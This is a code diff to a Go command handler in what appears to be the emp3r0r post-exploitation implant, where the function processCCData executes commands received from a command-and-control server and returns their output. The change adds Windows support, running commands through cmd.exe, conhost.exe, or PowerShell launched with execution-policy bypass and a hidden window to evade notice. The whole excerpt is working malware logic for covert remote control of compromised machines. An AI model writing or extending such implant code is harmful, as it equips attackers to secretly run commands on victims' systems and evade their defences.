@@ -248,7 +248,16 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 	default:
 		// exec cmd using os/exec normally, sends stdout and stderr back to CC
-		cmd := exec.Command(emp3r0r_data.DefaultShell, "-c", strings.Join(cmdSlice, " "))
+		cmd_arg := []string{"-c"}
+		if strings.HasPrefix(emp3r0r_data.DefaultShell, "cmd.exe") {
+			cmd_arg = []string{"/C"}
+		} else if strings.HasPrefix(emp3r0r_data.DefaultShell, "powershell.exe") {
+			cmd_arg = []string{"-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command"}
+		} else if strings.HasPrefix(emp3r0r_data.DefaultShell, "conhost.exe") {
+			cmd_arg = []string{"cmd.exe", "/C"}
+		}
+		cmd_arg = append(cmd_arg, strings.Join(cmdSlice, " "))
+		cmd := exec.Command(emp3r0r_data.DefaultShell, cmd_arg...)
 		outCombined, err = cmd.CombinedOutput()
 		if err != nil {
 			log.Println(err)
